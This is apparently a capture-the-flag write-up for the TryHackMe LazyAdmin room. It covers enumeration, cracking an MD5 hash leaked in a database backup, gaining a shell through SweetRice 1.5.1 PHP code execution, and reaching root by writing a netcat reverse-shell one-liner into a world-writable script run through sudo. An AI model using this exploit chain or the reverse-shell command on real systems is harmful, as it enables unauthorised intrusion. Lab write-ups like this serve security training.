
---

## LazyAdmin

IP = `10.10.53.64`

### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### banner Grabbing

```
# nc -nv 10.10.53.64 22
(UNKNOWN) [10.10.53.64] 22 (ssh) open
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8

```

### Gobuster

`gobuster dir -u 10.10.53.64 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100`

```
/content              (Status: 301) [Size: 312] [--> http://10.10.53.64/content/]
```

`gobuster dir -u 10.10.53.64/content/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100`

```
/images               (Status: 301) [Size: 319] [--> http://10.10.53.64/content/images/]
/js                   (Status: 301) [Size: 315] [--> http://10.10.53.64/content/js/]
/inc                  (Status: 301) [Size: 316] [--> http://10.10.53.64/content/inc/]
/as                   (Status: 301) [Size: 315] [--> http://10.10.53.64/content/as/]
/_themes              (Status: 301) [Size: 320] [--> http://10.10.53.64/content/_themes/]
/attachment           (Status: 301) [Size: 323] [--> http://10.10.53.64/content/attachment/]
```


### Initial Foothold

version of SweetRice, got from  `http://10.10.53.64/content/inc/lastest.txt`

version : `1.5.1`

```
# searchsploit sweetrice 1.5.1
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download                    | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                      | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                          | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                 | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Exec | php/webapps/40700.html
------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

need username to do the above exploit.

There is a mysql_backup file in `http://10.10.53.64/content/inc/mysql_backup/`

link - `http://10.10.53.64/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql`

```
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

there is md5 hash `42f749ade7f9e195bf475f37a44cafcb` in the mysql backup file.
may be mysql password for admin.

cracked!
`42f749ade7f9e195bf475f37a44cafcb` -> `Password123`

user is also mentioned as `manager`

`manager` : `Password123`




for SweetRice 1.5.1 there is PHP code execution vulnerablilty
`SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution`
https://www.exploit-db.com/exploits/40700

from this, we can understand that `In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add PHP Codes In Ads File. A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute PHP Codes On Server`

and the inserted ad can be seen in `inc/ads/filename.php`

insert `php-reverse-shell.php` of PentestMonkey into Ads code section.
`nc -lnvp 9999` in attackers machine

```
# nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.6.101.54] from (UNKNOWN) [10.10.166.241] 37272
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 18:50:15 up 26 min,  0 users,  load average: 0.00, 0.02, 0.26
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Got Shell!

**user.txt**

`THM{63e5bce9271952aad1113b6f1ac28a07}`

### Privilege Escalation

```
www-data@THM-Chal:/home/itguy$ ls
Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
Documents  Music      Public    Videos     examples.desktop  user.txt
```

`cat mysql_login.txt` 

```
rice:randompass
```

`sudo -l`

```
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$
```

```
www-data@THM-Chal:/home/itguy$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

```
www-data@THM-Chal:/home/itguy$ ls -la backup.pl
-rw-r--r-x 1 root root 47 Nov 29  2019 backup.pl
```

```
www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

we have read, write and execute permission for copy.sh

```
www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.101.54 9999 >/tmp/ > /etc/copy.sh
```

victim : 
```
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl


```

Attacker:
```
# nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.6.101.54] from (UNKNOWN) [10.10.166.241] 37276
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

Got root!

**root.txt**

`THM{6637f41d0177b6f37cb20d775124699f}`